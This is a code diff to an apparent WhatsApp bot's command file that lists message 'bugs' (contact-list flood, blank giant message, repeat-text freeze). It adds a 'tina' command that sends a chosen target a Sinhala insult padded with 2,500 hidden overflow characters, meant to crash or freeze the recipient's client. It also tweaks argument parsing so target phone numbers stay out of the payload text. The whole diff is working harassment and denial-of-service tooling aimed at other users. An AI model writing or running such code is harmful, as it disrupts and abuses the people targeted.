@@ -82,6 +82,7 @@ export default [
         `┃ ${p}cspam    — contact-list flood`,
         `┃ ${p}blankbug — blank-looking giant msg`,
         `┃ ${p}repeatbug — repeat-text freeze`,
+        `┃ ${p}tina      — dramatic roast crash`,
         '┃',
         '┃ Usage: reply/mention a number or',
         '┃ type the number after the command.',
@@ -100,7 +101,7 @@ export default [
     owner: true,
     async run({ sock, jid, msg, args, reply, targetJid }) {
       const target = targetJid() || jid;
-      const text   = (args.slice(0).join(' ').trim()) || '👋';
+      const text   = (args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g, ''))).join(' ').trim()) || '👋';
       const payload = text + overflowText(3000);
       try {
         await sock.sendMessage(target, { text: payload }, { quoted: msg });
@@ -238,6 +239,33 @@ export default [
       try {
         await sock.sendMessage(target, { text: payload }, { quoted: msg });
         return reply(`✅ Repeat-bug sent to @${target.split('@')[0]}`);
+      } catch (err) {
+        return reply(`❌ Failed: ${err?.message || err}`);
+      }
+    },
+  },
+
+  // ── tina ──────────────────────────────────────────────────────────────────
+  // Sends a "Tina" dramatic fake-breakup / roast message flood.
+  // Combines invisible overflow characters with a dramatic Sinhala roast
+  // so the notification preview shows the first line and the rest is hidden junk.
+  {
+    name: 'tina', aliases: ['tinabug', 'dramabug'],
+    owner: true,
+    async run({ sock, jid, msg, args, reply, targetJid }) {
+      const target = targetJid() || jid;
+      const name   = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g, ''))).join(' ').trim() || 'Tina';
+      // The visible part is a dramatic Sinhala roast; the overflow hides in the notification drawer.
+      const visible = [
+        `💔 *${name}*, ඔයා ගැන කතා කරන්නත් කාලය නාස්ති කරන්නේ නෑ.`,
+        `ඔය number block list ළ දාලා ඉවරයි 🚫`,
+        `WhatsApp uninstall කරන්නම හොඳයි 😂`,
+        `RIO-XMD bot ළ ඔයාට space නෑ 👋`,
+      ].join('\n');
+      const payload = visible + overflowText(2500);
+      try {
+        await sock.sendMessage(target, { text: payload }, { quoted: msg });
+        return reply(`✅ Tina bug sent to @${target.split('@')[0]}`);
       } catch (err) {
         return reply(`❌ Failed: ${err?.message || err}`);
       }
